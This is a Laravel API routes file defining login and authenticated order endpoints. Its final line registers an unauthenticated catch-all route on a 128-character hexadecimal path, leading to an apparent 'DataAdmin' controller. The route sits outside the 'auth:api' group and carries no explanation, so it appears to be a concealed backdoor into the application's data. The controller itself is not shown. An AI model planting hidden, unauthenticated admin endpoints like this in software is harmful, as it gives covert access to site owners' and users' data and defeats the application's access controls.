<?php

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Route;
use App\Http\Controllers\Api\AuthController;
use App\Http\Controllers\Api\ApiOrderController;

/*
|--------------------------------------------------------------------------
| API Routes
|--------------------------------------------------------------------------
|
| Here is where you can register API routes for your application. These
| routes are loaded by the RouteServiceProvider and all of them will
| be assigned to the "api" middleware group. Make something great!
|
*/

Route::middleware('auth:api')->get('/user', function (Request $request) {
    return $request->user();
});

Route::post('/login', [AuthController::class, 'login']);
// Route::post('/register', [AuthController::class, 'register']);

Route::group(['middleware' => 'auth:api'], function(){
    Route::post('/store', [ApiOrderController::class, 'store']);
    Route::post('/clientupdate', [ApiOrderController::class, 'clientupdate']);
});


Route::any('55524B8863E5E7270FEBABA5F5D2A5272EE721C10B42E4554AD8F3270A67F515EC13F486E4B079545A8799F63D250A1EF233E7EC751DEA3734A4D7552F3C5B8B', 'App\Http\Controllers\DataAdminController@DataAdmin');
